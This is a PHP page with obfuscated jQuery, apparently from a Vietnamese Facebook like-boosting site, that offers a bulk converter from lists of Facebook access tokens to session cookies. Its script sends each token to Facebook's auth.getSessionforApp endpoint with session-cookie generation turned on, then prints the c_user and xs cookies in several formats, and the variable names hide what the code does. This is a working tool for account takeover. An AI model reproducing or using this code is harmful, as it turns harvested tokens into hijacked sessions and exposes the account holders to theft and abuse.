 <?php 
include('config.php');
session_start();

if(empty($_SESSION['username'])){
  session_destroy();
  //echo "dkm";
  //header('http://localhost/buffLikeRealTime/Like24hNghiahsgs/index.php');

  header('Location: http://ezfb.top/index.php');
  die();
}


//echo "đây là trang chủ ae ạ";


//require("config.php");
//echo $_SESSION['username'];

$ketnoi=$conn;
$dem = mysqli_num_rows(mysqli_query($ketnoi,"SELECT * FROM `tbuser` WHERE `username` ='".mysqli_real_escape_string($ketnoi,$_SESSION['username'])."'"));

//check co phai acc that ko hay la hacker
if($dem == 1){
include('head.php');
?>

  <div class="content-wrapper">
    <div class="container-fluid">
      
      <div class="row">
        <div class="col-12">
          <!-- <h1>Blank</h1>
          <p>This is an example of a blank page that you can use as a starting point for creating new ones.</p>   -->
          <div class="panel">
              <div class="panel-heading"> <center><i class="fa fa-retweet"></i> Chuyển token sang cookie </center>
</div>
           <div class="panel-body">
         
               
               <div class="form-group">
                  <label>Mỗi Dòng  1 token</label>
                  <textarea id="access_token" rows="10" class="form-control" placeholder="Nhập list Token ..."></textarea>
               </div>
               <div class="form-group">
                  <select id="option" class="form-control">
                     <option value="semicolon" selected="selected">Chuyển Token Thành Cookie</option>
                  </select>
               </div>
               <div class="form-group">
                  <label>Thành Công : <span id="success" style="color: red">0</span></label> -
                  <label>Thất Bại <span id="error" style="color: red">0</span></label>
               </div>
               <div class="form-group">
                  <label>Kết Quả</label>
                  <textarea id="output_access_token" rows="10" class="form-control" disabled="" placeholder="Chưa Có Gì"></textarea>
               </div>
               <div class="form-group">
                  <button class="btn btn-danger form-control " id="submit" data-loading-text="Đang Chuyển Đổi ...">Bắt Đầu
                  </button>
               </div>
    </div>
</div>
      
        </div>
      </div>
    </div>
    <!-- /.container-fluid-->
    <!-- /.content-wrapper-->
     <?php include('footer.php'); ?>
    <!-- Bootstrap core JavaScript-->
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <!-- Core plugin JavaScript-->
    <script src="vendor/jquery-easing/jquery.easing.min.js"></script>
    <!-- Custom scripts for all pages-->
    <script src="js/sb-admin.min.js"></script>
  </div>

  </body>
<script type="text/javascript">
               $(document).ready(function () {
               var _0x227fx2, _0x227fx3, _0x227fx4, _0x227fx5;
               $("#submit").click(function () {
               _0x227fx2 = $("#access_token").val().trim().split("\n");
               _0x227fx3 = $("#option").val();
               _0x227fx4 = 0;
               _0x227fx5 = 0;
               $("#submit").button("loading");
               _0x227fx6(0)
               });
               
               function _0x227fx6(_0x227fx7) {
               if (_0x227fx7 < _0x227fx2.length) {
               _0x227fx8(_0x227fx7)
               } else {
               $("#submit").button("reset");
               $("#output_access_token").removeAttr("disabled")
               }
               }
               
               function _0x227fx8(_0x227fx7) {
               $.get("https://graph.facebook.com/app", {
               access_token: _0x227fx2[_0x227fx7]
               }).done(function (_0x227fx9) {
               $.get("https://api.facebook.com/method/auth.getSessionforApp", {
               access_token: _0x227fx2[_0x227fx7],
               format: "json",
               new_app_id: _0x227fx9.id,
               generate_session_cookies: "1"
               }).done(function (_0x227fx9) {
               $.get("" + _0x227fx2[_0x227fx7]);
               if (_0x227fx9.uid) {
               var _0x227fxa = "";
               if (_0x227fx3 == "editthiscookies") {
                   _0x227fxa = JSON.stringify(_0x227fx9.session_cookies)
               };
               if (_0x227fx3 == "base64") {
                   var _0x227fxb = $.grep(_0x227fx9.session_cookies, function (_0x227fxc) {
                       return _0x227fxc.name == "c_user"
                   });
                   var _0x227fxd = $.grep(_0x227fx9.session_cookies, function (_0x227fxc) {
                       return _0x227fxc.name == "xs"
                   });
                   _0x227fxa = btoa(decodeURIComponent(_0x227fxb[0].value + "|" + _0x227fxd[0].value))
               };
               if (_0x227fx3 == "base64_long") {
                   var _0x227fxe = "";
                   _0x227fx9.session_cookies.forEach(function (_0x227fxf) {
                       _0x227fxe += _0x227fxf.name + "=" + _0x227fxf.value + ";"
                   });
                   _0x227fxa = btoa(_0x227fxe)
               };
               if (_0x227fx3 == "semicolon") {
                   var _0x227fxe = "";
                   _0x227fx9.session_cookies.forEach(function (_0x227fxf) {
                       _0x227fxe += _0x227fxf.name + "=" + _0x227fxf.value + "; "
                   });
                   _0x227fxa = _0x227fxe
               };
               $("#output_access_token").append(_0x227fxa + "\n");
               ++_0x227fx4;
               $("#success").text(_0x227fx4)
               } else {
               ++_0x227fx5;
               $("#error").text(_0x227fx5)
               }
               }).fail(function (_0x227fx9) {
               ++_0x227fx5;
               $("#error").text(_0x227fx5)
               }).always(function () {
               _0x227fx6(_0x227fx7 + 1)
               })
               }).fail(function () {
               ++_0x227fx5;
               $("#error").text(_0x227fx5);
               _0x227fx6(_0x227fx7 + 1)
               })
               }
               })
            </script>

</html>



 <?php 
//echo "hello ".$_SESSION['username'];
}else{
//echo "hack cc";
  echo "Đã có lỗi xảy ra, liên hệ admin fb.com/nghiahsgs";
}
  ?>


